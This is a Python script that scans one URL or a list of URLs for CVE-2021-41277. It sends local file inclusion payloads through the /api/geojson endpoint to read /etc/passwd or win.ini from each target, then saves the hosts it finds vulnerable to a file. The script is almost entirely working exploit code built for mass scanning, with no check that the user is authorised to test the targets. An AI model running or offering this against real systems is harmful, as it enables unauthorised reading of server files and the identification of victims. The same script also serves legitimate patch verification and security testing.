import requests
import re
import argparse
requests.packages.urllib3.disable_warnings()

def loadfile(file):
    list = [line.strip() for line in open(file, 'r')]
    for i in range(0, len(list)):
        if not list[i].startswith(('http://', 'https://')):
            list[i] = 'http://' + list[i]
    return list

def vuln_check(url):
    try:
        url = url.rstrip('/')
        param1 = "/api/geojson?url=file:/etc/passwd"
        param2 = "/api/geojson?url=file://c://windows/win.ini"
        headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }
        res1 = requests.get(url=url+param1, headers=headers, verify=False, timeout=15)
        res2 = requests.get(url=url+param2, headers=headers, verify=False, timeout=15)
        if res1.status_code == 200:
            list = re.findall("root:[x*]:0:0", res1.text)
            if list:
                print("[+]" + res1.url + " may have vuln!")
                return url
            else:
                print("NO!")
        elif res2.status_code == 200 and "for 16-bit app support" in res2.text:
            print("[+]" + res2.url + " may have vuln!")
            return url
        else:
            print("[+]" + url + " no vuln")
    except Exception as e:
        print("[-]" + str(e))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CVE-2021-41277")
    parser.add_argument('-u', '--url', type=str, help="url like http://127.0.0.1:8080")
    parser.add_argument('-f', '--file', type=str, help="url file path")
    args = parser.parse_args()

    if args.url and args.file:
        print("[-]wrong! Please choose one to scan!")
    elif args.url:
        vuln_check(args.url)
    elif args.file:
        list = loadfile(args.file)
        suc_list = []
        for i in list:
            vul_url = vuln_check(i)
            if vul_url:
                suc_list.append(vul_url)
        print("-" * 25 + "检测结果" + "-" * 25)
        print("[+]成功：%d, 失败：%d" % (len(suc_list), len(list) - len(suc_list)))
        print("*" * 25 + "成功列表" + "*" * 25)
        for i in suc_list:
            print("[+]" + i + " 存在漏洞")

        # 将成功的结果输出到 results.txt 文件中
        with open('results.txt', 'w') as f:
            for url in suc_list:
                f.write(url + "\n")
